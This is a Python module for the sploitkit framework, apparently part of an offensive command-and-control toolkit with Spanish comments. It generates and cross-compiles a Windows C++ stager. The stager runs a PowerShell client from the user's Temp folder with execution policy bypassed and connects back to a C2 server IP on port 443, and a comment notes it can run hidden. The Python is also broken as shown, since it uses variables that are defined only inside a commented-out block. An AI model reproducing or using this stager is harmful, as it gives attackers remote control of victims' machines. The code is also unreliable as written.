from sploitkit import *
import os
import subprocess
from template import Procedure

class multi_stage_channels(Module):
	""" Description Here

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
        Option(
            'OPT', #option
            "Description", #description
            True,	#Required = True, Optional = False
            #set_callback=lambda o: o.root._set_app_folder(), #execute a function if required
        ): "default", #Default value
    })

	def run(self):
		#Webroot
		parent_path = "Prueba/sourcecodes/"
		parent_webroot_path = "Prueba/webroot/"

		c2client = ''.join(list(self.config.get('OPT'))) #Assign option value to variable

		c2client = "client.ps1"
		'''
		ipaddr = "10.10.1.13"
		name = 'ejecutarPSs.cpp'
		fullname = parent_path+name
		exename = "envia"
		outfile = parent_webroot_path + exename
		'''


		STARTC2 = '''
		#include <iostream>
		#include <winsock2.h>
		#include <windows.h>
		#include <string>
		#pragma comment(lib, "urlmon.lib")
		#include <lmcons.h>
		#include <cstring>
		#define PSSCRIPT "%s"
		#define IPADDR "%s"
		using namespace std;

		int main(void){
		       string nombre_script = PSSCRIPT;
		       string ipaddr = IPADDR;
		       char username[UNLEN+1];
		       DWORD username_len = UNLEN+1;
		       GetUserName(username, &username_len);
		       string user(username);      
		       string ruta_script = "C:\\\\Users\\\\" + user + "\\\\AppData\\\\Local\\\\Temp\\\\" + nombre_script;
		       string strCMD = "start powershell.exe -executionpolicy bypass -Command \\"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\\"";
		       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.

		}
		''' % (c2client, ipaddr)

		f = open(fullname,"w")
		f.write(STARTC2)
		print("Archivo "+ fullname + " creado.")
		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
		subprocess.Popen(args)
		print("Compilado {}.".format(outfile))